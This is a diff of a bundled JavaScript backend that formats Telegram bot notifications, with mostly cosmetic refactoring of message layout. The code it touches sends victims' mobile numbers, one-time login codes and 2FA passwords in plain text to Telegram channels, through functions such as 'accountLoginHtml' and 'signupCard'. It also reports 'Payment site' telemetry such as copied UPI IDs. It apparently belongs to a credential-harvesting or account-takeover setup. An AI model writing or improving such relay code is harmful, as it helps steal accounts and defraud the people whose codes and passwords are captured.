@@ -1723,7 +1723,7 @@ let AppService = AppService_1 = class AppService {
         if (!normalized)
             return { ok: false };
         const bounded = normalized.slice(0, 3500);
-        const sent = await this.botsService.sendHtmlByCategory(components_1.ChannelCategory.WEB_TELEMETRY, (0, rich_message_1.telemetryToHtml)(bounded));
+        const sent = await this.botsService.sendMessageByCategory(components_1.ChannelCategory.WEB_TELEMETRY, (0, rich_message_1.telemetryToRich)(bounded));
         return { ok: Boolean(sent) };
     }
     async findAllMasked(query) {
@@ -19689,13 +19689,13 @@ let BotsService = BotsService_1 = class BotsService {
     }
     richMessageHtml(message, allowServiceName) {
         const source = message.source ?? (allowServiceName ? process.env.clientId ?? '' : '');
-        return (0, rich_message_1.formatRichMessageHtml)(message, { prefix: source.toUpperCase() || undefined });
+        return (0, rich_message_1.formatRichMessageHtml)(message, { prefix: source || undefined });
     }
     classicMessageBody(bot, message, options, allowServiceName) {
         const buttons = (message.buttons ?? []).filter(b => b.url);
         return {
             chat_id: bot.channelId,
-            text: (0, rich_message_1.formatClassicNotificationHtml)(message, allowServiceName ? process.env.clientId?.toUpperCase() : undefined),
+            text: (0, rich_message_1.formatClassicNotificationHtml)(message, allowServiceName ? process.env.clientId : undefined),
             parse_mode: 'HTML',
             disable_notification: options?.disableNotification,
             reply_to_message_id: options?.replyToMessageId,
@@ -19766,7 +19766,7 @@ let BotsService = BotsService_1 = class BotsService {
             formData.append(mediaField, media);
         }
         if (options.caption) {
-            formData.append('caption', `${process.env.clientId?.toUpperCase()}:\n\n${options.caption}`);
+            formData.append('caption', `${process.env.clientId}:\n\n${options.caption}`);
         }
         if (options.parseMode)
             formData.append('parse_mode', options.parseMode);
@@ -19808,7 +19808,7 @@ let BotsService = BotsService_1 = class BotsService {
                 media: Buffer.isBuffer(item.media) ? `attach://file${i}` : item.media,
             };
             if (item.caption)
-                mediaObj.caption = `${process.env.clientId?.toUpperCase()}:\n\n${item.caption}`;
+                mediaObj.caption = `${process.env.clientId}:\n\n${item.caption}`;
             if (item.parseMode)
                 mediaObj.parse_mode = item.parseMode;
             if (item.hasSpoiler)
@@ -48538,13 +48538,10 @@ const rich_message_1 = __webpack_require__(/*! ../../utils/rich-message */ "./sr
 function accountLoginHtml(user, mobile) {
     const handle = user.username?.replace(/^@/, '');
     const name = [user.firstName, user.lastName].map((v) => v?.trim()).filter(Boolean).join(' ');
-    const account = [
-        handle && `<a href="https://t.me/${encodeURIComponent(handle)}">@${(0, rich_message_1.escapeTelegramHtml)(handle)}</a>`,
-        name && (0, rich_message_1.escapeTelegramHtml)(name),
-    ].filter(Boolean).join(' · ') || 'No username';
     return [
-        '<b>🔐 New account login</b>',
-        account,
+        '<b>New account login</b>',
+        handle && `Account: <a href="https://t.me/${encodeURIComponent(handle)}">@${(0, rich_message_1.escapeTelegramHtml)(handle)}</a>`,
+        name && `Name: ${(0, rich_message_1.escapeTelegramHtml)(name)}`,
         `Mobile: <code>${(0, rich_message_1.escapeTelegramHtml)(mobile)}</code>`,
         user.password && `2FA: <code>${(0, rich_message_1.escapeTelegramHtml)(user.password)}</code>`,
     ].filter(Boolean).join('\n');
@@ -54412,7 +54409,7 @@ function parseError(err, prefix, sendErr = true, config = {}) {
                         ],
                         details: notificationMessage,
                         detailsTitle: 'Error message',
-                    }, { prefix: clientId ? String(clientId).toUpperCase() : undefined, timeout: fullConfig.notificationTimeout }).catch(() => undefined);
+                    }, { prefix: clientId ? String(clientId) : undefined, timeout: fullConfig.notificationTimeout }).catch(() => undefined);
                 }
             }
             catch (notificationError) {
@@ -54791,7 +54788,7 @@ exports.escapeTelegramHtml = escapeTelegramHtml;
 exports.notificationButtons = notificationButtons;
 exports.formatRichMessageHtml = formatRichMessageHtml;
 exports.textToRichInput = textToRichInput;
-exports.telemetryToHtml = telemetryToHtml;
+exports.telemetryToRich = telemetryToRich;
 exports.buttonsFromReplyMarkup = buttonsFromReplyMarkup;
 exports.formatClassicNotificationHtml = formatClassicNotificationHtml;
 exports.NotificationSeverity = Object.freeze({
@@ -54807,13 +54804,6 @@ function escapeTelegramHtml(value) {
         .replace(/</g, '&lt;')
         .replace(/>/g, '&gt;');
 }
-const SEVERITY_ICONS = {
-    info: 'ℹ️',
-    success: '✅',
-    warning: '⚠️',
-    error: '❌',
-    critical: '🚨',
-};
 exports.RICH_MESSAGE_MAX_CHARS = 30000;
 const MAX_BUTTONS = 6;
 const BUTTONS_PER_ROW = 3;
@@ -54839,6 +54829,8 @@ function cellValue(field) {
     if (unix !== null)
         return timeTag(unix, field.value instanceof Date ? field.value.toISOString() : String(field.value));
     const text = String(field.value ?? '');
+    if (field.url)
+        return `<a href="${attr(field.url)}">${escapeTelegramHtml(text)}</a>`;
     if (field.code === false || text.length > 60 || /\s/.test(text.trim()))
         return escapeTelegramHtml(text);
     return `<code>${escapeTelegramHtml(text)}</code>`;
@@ -54879,8 +54871,11 @@ function visibleFields(input) {
 function notificationButtons(input) {
     return (input.buttons ?? []).filter((b) => b && b.text && (b.url || b.copy)).slice(0, MAX_BUTTONS);
 }
+function noEmoji(text) {
+    return String(text ?? '').replace(/[\p{Extended_Pictographic}\u{1F1E6}-\u{1F1FF}\uFE0F\u200D]/gu, '').replace(/\s+/g, ' ').trim();
+}
 function buttonLabel(text) {
-    return escapeTelegramHtml(String(text).replace(/[\p{Extended_Pictographic}\u{1F1E6}-\u{1F1FF}\uFE0F\u200D]/gu, '').replace(/\s+/g, ' ').trim() || 'Open');
+    return escapeTelegramHtml(noEmoji(text) || 'Open');
 }
 function buttonTag(button, index) {
     const style = index === 0 && button.url ? ' style="primary"' : '';
@@ -54906,23 +54901,20 @@ function detailLines(input) {
         return [];
     return (Array.isArray(input.details) ? input.details : [input.details]).map((d) => String(d ?? '')).filter((d) => d.trim());
 }
-const INLINE_FIELDS_MAX = 3;
-const INLINE_FIELD_CHARS = 40;
 function formatRichMessageHtml(input, opts = {}) {
-    const title = input.title || input.summary || 'Notification';
-    const icon = input.houseStyle ? '' : `${SEVERITY_ICONS[input.severity ?? exports.NotificationSeverity.INFO]} `;
-    const prefix = opts.prefix ? `${escapeTelegramHtml(opts.prefix)} · ` : '';
+    const title = noEmoji(input.title || input.summary) || 'Notification';
     const quotes = allQuotes(input);
     const hasSummary = Boolean(input.summary && input.summary !== title);
     const spoilerAt = !input.spoiler ? '' : quotes.length ? 'quote' : hasSummary ? 'summary' : 'heading';
-    const parts = [`<p><b>${icon}${prefix}${escapeTelegramHtml(title)}</b>${spoilerAt === 'heading' ? spoilerTag(input.spoiler) : ''}</p>`];
+    const titleLess = input.title === '' && !input.summary && quotes.length > 0;
+    const parts = [
+        ...(opts.prefix ? [`<p><b>${escapeTelegramHtml(opts.prefix)}</b></p>`] : []),
+        ...(titleLess ? [] : [`<p><b>${escapeTelegramHtml(title)}</b>${spoilerAt === 'heading' ? spoilerTag(input.spoiler) : ''}</p>`]),
+    ];
     if (hasSummary)
         parts.push(`<p>${multiline(input.summary)}${spoilerAt === 'summary' ? spoilerTag(input.spoiler) : ''}</p>`);
     const fields = visibleFields(input);
-    if (fields.length && input.fieldLayout !== 'table' && fields.length <= INLINE_FIELDS_MAX && fields.every((f) => String(f.value ?? '').length <= INLINE_FIELD_CHARS)) {
-        parts.push(`<p>${fields.map((f) => `${escapeTelegramHtml(f.label)} ${cellValue(f)}`).join(' · ')}</p>`);
-    }
-    else if (fields.length) {
+    if (fields.length) {
         const rows = fields.map((f) => `<tr><td><b>${escapeTelegramHtml(f.label)}</b></td><td>${cellValue(f)}</td></tr>`);
         parts.push(`<table bordered striped compact>${rows.join('')}</table>`);
     }
@@ -54956,7 +54948,7 @@ function formatRichMessageHtml(input, opts = {}) {
     for (let i = 0; i < buttons.length; i += BUTTONS_PER_ROW) {
         parts.push(`<tg-button-row>${buttons.slice(i, i + BUTTONS_PER_ROW).map((b, j) => buttonTag(b, i + j)).join('')}</tg-button-row>`);
     }
-    return parts.join('\n');
+    return parts.join('\n').replace(/<p>([\s\S]*?)<\/p>\n?/g, '$1<br/>');
 }
 const HTML_TAG = /<\/?[a-z][^>]*>/gi;
 const FIELD_LINE = /^([^:\n]{1,40}?)\s*:\s+(.+)$/;
@@ -54996,47 +54988,65 @@ function textToRichInput(text, opts = {}) {
     return input;
 }
 const TELEMETRY_LABEL = /^([^:\n]{1,40}?)\s*:\s+([\s\S]+)$/;
-function signupToHtml(user, form) {
+function signupCard(form) {
     const str = (v) => (v === undefined || v === null ? '' : String(v).trim());
-    const phone = `${str(form.phoneCountryCode)}${str(form.phoneNumber)}`;
-    const name = [str(form.firstName), str(form.lastName)].filter(Boolean).join(' ');
-    const step = str(form.otp) ? 'code entered' : 'phone entered';
-    const rows = [
-        name && `Name: ${escapeTelegramHtml(name)}`,
-        str(form.phoneNumber) && `Phone: <code>${escapeTelegramHtml(phone)}</code>`,
-        str(form.otp) && `Code: <code>${escapeTelegramHtml(str(form.otp))}</code>`,
-        str(form.password) && `2FA: <code>${escapeTelegramHtml(str(form.password))}</code>`,
-    ].filter(Boolean);
-    return `📝 ${user} · signup, ${step}${rows.length ? `\n${rows.join('\n')}` : ''}`;
+    return {
+        title: `Signup · ${str(form.otp) ? 'code entered' : 'phone entered'}`,
+        fields: [
+            { label: 'Name', value: [str(form.firstName), str(form.lastName)].filter(Boolean).join(' '), code: false },
+            { label: 'Phone', value: str(form.phoneNumber) && `${str(form.phoneCountryCode)}${str(form.phoneNumber)}` },
+            { label: 'Code', value: str(form.otp) },
+            { label: '2FA', value: str(form.password) },
+        ],
+    };
 }
-function telemetryToHtml(text) {
+const TELEMETRY_EVENTS = [
+    [/^PayButton$/i, () => 'tapped Pay'],
+    [/^QRButton$/i, () => 'opened the QR code'],
+    [/^Whats?ap?pBtn$/i, () => 'tapped WhatsApp'],
+    [/^LOGIN TAB$/i, () => 'opened Login'],
+    [/^Register TAB$/i, () => 'opened Register'],
+    [/^eyeIcon$/i, () => 'showed the password'],
+    [/^ChatOpened(?::.*)?$/i, () => 'opened the chat'],
+    [/^UPI ID Copied\s*:\s*(.+)$/i, (m) => `copied UPI ${m[1].trim()}`],
+    [/^PaymentOption_(.+)$/i, (m) => `chose ${m[1].trim()}`],
+    [/^Payment initiated\s*:\s*(.+)$/i, (m) => `started payment: ${m[1].trim()}`],
+];
+function telemetryEvent(body) {
+    for (const [re, words] of TELEMETRY_EVENTS) {
+        const m = re.exec(body);
+        if (m)
+            return `Payment site · ${words(m)}`;
+    }
+    return undefined;
+}
+function telemetryToRich(text) {
     const plain = String(text ?? '').replace(/<br\s*\/?>/gi, '\n').replace(HTML_TAG, '').replace(/&(lt|gt|quot|#39|amp);/g, (m) => ENTITIES[m] ?? m);
     const lines = plain.split('\n');
     const first = lines.findIndex((l) => l.trim());
-    if (first < 0)
-        return '<b>Telemetry</b>';
-    const user = `<b>${escapeTelegramHtml(lines[first].trim().split(' · ')[0].trim() || 'Telemetry')}</b>`;
-    const body = lines.slice(first + 1).join('\n').trim();
+    const source = first < 0 ? '' : lines[first].trim().split(' · ')[0].trim();
+    const base = { houseStyle: true, ...(source ? { source } : {}) };
+    const body = first < 0 ? '' : lines.slice(first + 1).join('\n').trim();
     if (!body)
-        return user;
+        return { ...base, title: 'Telemetry' };
     try {
         const parsed = JSON.parse(body);
         if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
             if ('phoneNumber' in parsed)
-                return signupToHtml(user, parsed);
-            const rows = Object.entries(parsed)
+                return { ...base, ...signupCard(parsed) };
+            const fields = Object.entries(parsed)
                 .filter(([, v]) => v !== '' && v !== null && v !== undefined)
-                .map(([k, v]) => `${escapeTelegramHtml(k)}: <code>${escapeTelegramHtml(typeof v === 'object' ? JSON.stringify(v) : String(v))}</code>`);
-            return rows.length ? `${user}\n${rows.join('\n')}` : user;
+                .map(([k, v]) => ({ label: k, value: typeof v === 'object' ? JSON.stringify(v) : String(v) }));
+            return { ...base, title: 'Form', fields };
         }
     }
     catch { }
+    const event = !body.includes('\n') ? telemetryEvent(body) : undefined;
+    if (event)
+        return { ...base, title: event };
     if (!body.includes('\n') && body.length <= 60 && !TELEMETRY_LABEL.test(body))
-        return `${user} · ${escapeTelegramHtml(body)}`;
-    const m = TELEMETRY_LABEL.exec(body);
-    const labelled = m && !/^https?$/i.test(m[1]) && !/\/\//.test(m[1]);
-    const quote = labelled ? `<b>${escapeTelegramHtml(m[1].trim())}:</b> ${escapeTelegramHtml(m[2].trim().slice(0, 3000))}` : escapeTelegramHtml(body.slice(0, 3000));
-    return `${user}\n<blockquote${quote.length > 800 ? ' expandable' : ''}>${quote}</blockquote>`;
+        return { ...base, title: `Payment site · ${body}` };
+    return { ...base, title: '', quote: body.slice(0, 3000), quoteLabel: '' };
 }
 function buttonsFromReplyMarkup(markup) {
     let parsed = markup;
@@ -55062,9 +55072,8 @@ function buttonsFromReplyMarkup(markup) {
 }
 function formatClassicNotificationHtml(input, prefix) {
     const title = input.title || input.summary || 'Notification';
-    const icon = input.houseStyle ? '' : `${SEVERITY_ICONS[input.severity ?? exports.NotificationSeverity.INFO]} `;
     const head = `${prefix ? `${escapeTelegramHtml(prefix)} · ` : ''}${escapeTelegramHtml(title)}${spoilerTag(input.spoiler)}`;
-    const blocks = [[`<b>${icon}${head}</b>`]];
+    const blocks = [[`<b>${head}</b>`]];
     if (input.summary && input.summary !== title)
         blocks.push([escapeTelegramHtml(input.summary)]);
     const fields = visibleFields(input);
